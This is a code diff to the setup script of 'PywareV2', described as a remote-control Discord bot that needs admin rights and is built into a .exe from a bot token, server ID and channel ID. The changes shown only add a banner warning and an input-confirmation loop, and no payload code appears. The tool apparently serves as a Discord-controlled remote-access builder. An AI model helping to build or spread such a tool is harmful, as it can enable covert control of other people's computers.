@@ -13,6 +13,7 @@ PLACEHOLDERS = {
 def set_title():
     os.system("title Setup PywareV2 - V1.2")
 
+
 def logo():
     print("""
   ____                             __     ______  
@@ -22,21 +23,39 @@ def logo():
  |_|    \__, | \_/\_/ \__,_|_|  \___| \_/  |_____|
         |___/                                      
 ---------------------------------------------------
-🔧 Remote Control Discord-Bot made by Ole4923
+|🔧 Remote Control Discord-Bot made by Ole4923.   |
+|⚠️ Important: The Bot need admin rights!         |
 ---------------------------------------------------
     """)
 
 def ask_user_inputs():
-    token = input("👉 Bot Token: ").strip()
-    clear_screen()
-    logo()
-    server_id = input("👉 Server-ID: ").strip()
-    clear_screen()
-    logo()
-    channel_id = input("👉 Channel-ID: ").strip()
-    clear_screen()
-    logo()
-    return token, server_id, channel_id
+    while True:
+        token = input("👉 Bot Token: ").strip()
+        clear_screen()
+        logo()
+        server_id = input("👉 Server-ID: ").strip()
+        clear_screen()
+        logo()
+        channel_id = input("👉 Channel-ID: ").strip()
+        clear_screen()
+        logo()
+
+        # Bestätigung einholen
+        print("Please double-check the following values:")
+        print(f"|🔑 Token: {token}")
+        print(f"|🖥️  Server ID: {server_id}")
+        print(f"|💬 Channel ID: {channel_id}")
+        
+        confirmation = input("✅/❌ Do you want to build a .exe? (yes/no): ").strip().lower()
+        
+        if confirmation in ["yes", "y"]:
+            print("✔️ Confirmed.\n")
+            return token, server_id, channel_id
+        else:
+            print("🔁 Let's try again...\n")
+            clear_screen()
+            logo()
+
 
 def clear_screen():
     os.system('cls' if os.name == 'nt' else 'clear')
